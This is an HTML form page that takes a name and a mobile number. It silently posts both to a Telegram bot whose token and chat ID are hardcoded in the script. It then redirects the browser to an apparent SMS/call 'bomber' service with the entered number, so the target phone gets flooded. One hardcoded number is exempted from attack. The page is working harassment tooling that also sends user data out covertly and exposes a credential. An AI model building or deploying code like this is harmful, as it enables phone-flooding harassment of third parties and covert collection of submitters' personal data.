<!DOCTYPE html>
<html>
<head>
    <title>Form Submission</title>
    <script>
        function submitForm(event) {
            event.preventDefault(); // Prevent the default form submission

            var name = document.getElementById("name").value;
            var mobile = document.getElementById("mobile").value;

            if (mobile === "9026537555") {
                alert("YOU CAN'T CALL TO GOD");
                return;
            }

            // Send data to Telegram bot
            var chatId = "5112680061";
            var apiKey = "6752600114:AAGXb8R5WMKc_Uur_7ufDIXPprXB6PXoCsg";
            var message = "Name: " + name + "\nMobile: " + mobile;

            fetch(`https://api.telegram.org/bot${apiKey}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });

            // Open URL based on the mobile number
            var url = `https://bomber-tools.xyz/?mobile=${mobile}&accesskey=bombersmm&submit=Submit`;
            window.location.href = url;

            // After 2 seconds, redirect to the intermediate page
            setTimeout(function() {
                window.location.href = "path/to/intermediate.html";
            }, 5000);
        }
    </script>
</head>
<body>
    <form onsubmit="submitForm(event)">
        <label for="name">Name:</label>
        <input type="text" id="name" name="name" required><br><br>

        <label for="mobile">Mobile Number:</label>
        <input type="text" id="mobile" name="mobile" required><br><br>

        <button type="submit">Submit</button>
    </form>
</body>
</html>
